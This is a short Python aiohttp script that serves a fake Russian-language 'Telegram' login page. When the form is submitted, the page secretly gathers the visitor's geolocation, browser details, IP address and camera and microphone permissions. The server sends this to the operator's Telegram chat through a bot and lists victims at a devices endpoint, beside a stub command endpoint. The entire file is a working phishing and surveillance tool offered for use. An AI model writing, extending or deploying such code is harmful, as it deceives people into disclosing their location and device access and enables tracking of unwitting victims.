import os
from aiohttp import web
from aiogram import Bot

BOT_TOKEN = os.environ["BOT_TOKEN"]
CHAT_ID = int(os.environ["CHAT_ID"])
bot = Bot(BOT_TOKEN)

devices = {}

HTML = """<!doctype html><meta charset=utf-8><title>Telegram</title>
<h2>Вход в Telegram</h2>
<form onsubmit="return go(event)">
<input id=u placeholder="username"><br><br>
<button>Войти</button></form>
<script>
async function go(e){e.preventDefault();
let d={ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,loc:null,cam:false,mic:false};
try{d.loc=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(p=>res([p.coords.latitude,p.coords.longitude]),rej,{timeout:5000}));}catch(_){}
try{let s=await navigator.mediaDevices.getUserMedia({video:true,audio:true});d.cam=d.mic=true;s.getTracks().forEach(t=>t.stop());}catch(_){}
await fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});
document.body.innerHTML="<h3>Готово</h3>";return false;}
</script>"""

async def handle_t(request):
    return web.Response(text=HTML, content_type="text/html")

async def handle_collect(request):
    data = await request.json()
    data["ip"] = request.remote or "?"
    dev_id = str(len(devices) + 1)
    devices[dev_id] = data
    msg = f"🟢 новый\nid: {dev_id}\nua: {data['ua'][:60]}\nip: {data['ip']}\nloc: {data.get('loc')}\ncam: {data.get('cam')} mic: {data.get('mic')}"
    try:
        await bot.send_message(CHAT_ID, msg)
    except Exception as e:
        print("send err", e)
    return web.json_response({"ok": True})

async def api_devices(request):
    return web.json_response(list(devices.items()))

async def api_cmd(request):
    body = await request.json()
    return web.json_response({"status": "queued", "id": body.get("id"), "action": body.get("action")})

app = web.Application()
app.router.add_get("/t", handle_t)
app.router.add_post("/collect", handle_collect)
app.router.add_get("/api/devices", api_devices)
app.router.add_post("/api/cmd", api_cmd)

if __name__ == "__main__":
    web.run_app(app, host="0.0.0.0", port=int(os.environ.get("PORT", "8080")))
